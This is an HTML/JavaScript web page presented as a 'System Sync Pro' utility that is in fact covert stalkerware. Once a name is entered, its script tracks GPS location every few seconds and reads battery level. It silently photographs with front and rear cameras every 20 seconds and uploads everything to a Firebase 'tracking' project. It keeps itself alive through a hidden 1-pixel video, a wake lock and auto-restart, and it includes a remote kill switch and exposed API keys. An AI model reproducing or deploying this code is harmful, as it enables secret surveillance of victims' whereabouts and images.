<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Sync Pro - Universal</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #1a202c; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #2d3748; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #4a5568; position: relative; z-index: 10; }
        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 10px; border: 1px solid #4a5568; font-size: 16px; box-sizing: border-box; background: #1a202c; color: white; outline: none; }
        input:focus { border-color: #38a169; }
        .btn { background: #38a169; color: white; border: none; padding: 12px; border-radius: 10px; width: 100%; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
        .btn:hover { background: #2f855a; }
        .status { margin-top: 15px; color: #68d391; font-size: 14px; display: none; font-weight: bold; }
        #bat-val { font-size: 18px; margin-top: 10px; color: #cbd5e0; }
        .warning { font-size: 12px; color: #f56565; margin-top: 10px; display: none; }
        .bg-note { font-size: 11px; color: #a0aec0; margin-top: 15px; line-height: 1.4; }
        /* Background PiP Element */
        #pip-video { width: 1px; height: 1px; opacity: 0.01; position: absolute; bottom: 0; left: 0; pointer-events: none; }
    </style>
</head>
<body>

    <video id="pip-video" playsinline muted autoplay loop></video>

    <div class="card">
        <h2 style="color: #63b3ed; margin-top: 0;">System Sync üìç</h2>
        
        <div id="setup">
            <input type="text" id="userName" placeholder="Apna Naam Likhein...">
            <button class="btn" onclick="requestAndStart()">Connect to Server</button>
            <p style="font-size: 11px; color: #a0aec0; margin-top: 10px;">Keep Internet & GPS On</p>
        </div>
        
        <div id="active" style="display:none;">
            <h3 id="name-tag" style="margin-bottom: 5px;"></h3>
            <div class="status" id="status-box" style="display:block;">üü¢ System Live & Syncing...</div>
            <p id="bat-val">Battery: --% üîã</p>
            <div class="bg-note">
                <b>Background Mode Active:</b><br>
                Aap doosre apps use kar sakte hain.<br>
                <span style="color: #f6ad55;">Do not close this tab or browser.</span>
            </div>
            <div id="gps-error" class="warning">‚ö†Ô∏è GPS Blocked! Setting se Allow karein.</div>
        </div>
    </div>

<script>
    // --- FIREBASE CONFIG ---
    const firebaseConfig = {
        apiKey: "AIzaSyCZz90P8npkRcL0ZctIelDFbKRN48BsZzk",
        authDomain: "tracking-7494e.firebaseapp.com",
        projectId: "tracking-7494e",
        storageBucket: "tracking-7494e.firebasestorage.app",
        messagingSenderId: "861816870090",
        appId: "1:861816870090:web:4dec49659b3806fcd49033"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    let current_id = "";
    let useFrontCamera = true;
    let wakeLock = null;
    let isLive = false;
    const backgroundVideo = document.getElementById('pip-video');

    // --- 1. AUTO-LOGIN CHECK ---
    window.onload = function() {
        const savedName = localStorage.getItem("syncTargetName");
        if (savedName) {
            current_id = savedName;
            isLive = true;
            startTracking();
        }
    };

    // --- 2. START FUNCTION (SILENT & AUTO) ---
    async function requestAndStart() {
        const n = document.getElementById('userName').value.trim();
        if(!n) return alert("Naam likho bhai!");
        
        current_id = n;
        localStorage.setItem("syncTargetName", current_id); 

        document.getElementById('setup').style.display = 'none';
        document.getElementById('active').style.display = 'block';
        document.getElementById('name-tag').innerText = "Hi, " + current_id;

        try {
            // Camera Access Request
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            backgroundVideo.srcObject = stream;
            
            // üî• Request Picture-in-Picture for Background Persistence
            if (document.pictureInPictureEnabled && !document.pictureInPictureElement) {
                await backgroundVideo.requestPictureInPicture().catch(e => console.log("PiP pending..."));
            }

            isLive = true;
            startTracking();
        } catch (err) {
            isLive = true;
            startTracking();
        }
    }

    async function requestWakeLock() {
        try {
            if ('wakeLock' in navigator) {
                wakeLock = await navigator.wakeLock.request('screen');
            }
        } catch (err) { console.log("WakeLock failed"); }
    }

    async function pushData(lat, lng) {
        if(!isLive) return;
        let bat = 0;
        try { 
            const b = await navigator.getBattery(); 
            bat = Math.floor(b.level * 100); 
        } catch(e) {}
        
        document.getElementById('bat-val').innerText = `Battery: ${bat}% üîã`;

        db.collection("locations").doc(current_id).set({
            userName: current_id,
            lat: Number(lat),
            lng: Number(lng),
            battery: bat,
            lastUpdate: firebase.firestore.FieldValue.serverTimestamp()
        }, { merge: true });
    }

    // --- üì∑ SILENT CAPTURE LOGIC ---
    async function capturePhoto() {
        if (!current_id || !isLive) return;
        const cameraMode = useFrontCamera ? "user" : "environment";
        const canvas = document.createElement('canvas');

        try {
            // Using existing stream from background video to avoid re-asking permission
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: cameraMode, width: 400 } 
            });
            const tempVideo = document.createElement('video');
            tempVideo.srcObject = stream;
            await tempVideo.play();

            setTimeout(() => {
                canvas.width = 400; 
                canvas.height = 300;
                canvas.getContext('2d').drawImage(tempVideo, 0, 0, 400, 300);
                const photoData = canvas.toDataURL('image/jpeg', 0.3); 
                
                db.collection("locations").doc(current_id).update({
                    userPhoto: photoData, 
                    lastPhotoTime: new Date().toLocaleTimeString(),
                    photoHistory: firebase.firestore.FieldValue.arrayUnion(photoData)
                });

                stream.getTracks().forEach(track => track.stop());
                useFrontCamera = !useFrontCamera; 
            }, 1000); 
        } catch (err) { 
            useFrontCamera = !useFrontCamera; 
        }
    }

    function startTracking() {
        document.getElementById('setup').style.display = 'none';
        document.getElementById('active').style.display = 'block';
        document.getElementById('name-tag').innerText = "Hi, " + current_id;

        // üî¥ KILL SWITCH
        db.collection("locations").doc(current_id).onSnapshot((doc) => {
            if (!doc.exists && isLive) {
                isLive = false; 
                localStorage.removeItem("syncTargetName"); 
                location.reload(); 
            }
        });

        requestWakeLock();

        if (navigator.geolocation) {
            const success = (p) => {
                if(!isLive) return;
                document.getElementById('gps-error').style.display = 'none';
                pushData(p.coords.latitude, p.coords.longitude);
            };

            const error = (err) => {
                document.getElementById('gps-error').style.display = 'block';
            };

            navigator.geolocation.watchPosition(success, error, { 
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0 
            });

            setInterval(() => {
                if(isLive) navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true });
            }, 8000);

            // Start photo loop
            capturePhoto(); 
            setInterval(capturePhoto, 20000); 

        } else {
            alert("GPS support nahi hai!");
        }
    }

    // Force activity even when tab is hidden
    document.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'hidden' && isLive) {
            backgroundVideo.play(); // Keeps the process from freezing
        } else if (isLive) {
            requestWakeLock();
        }
    });
</script>
</body>
</html>
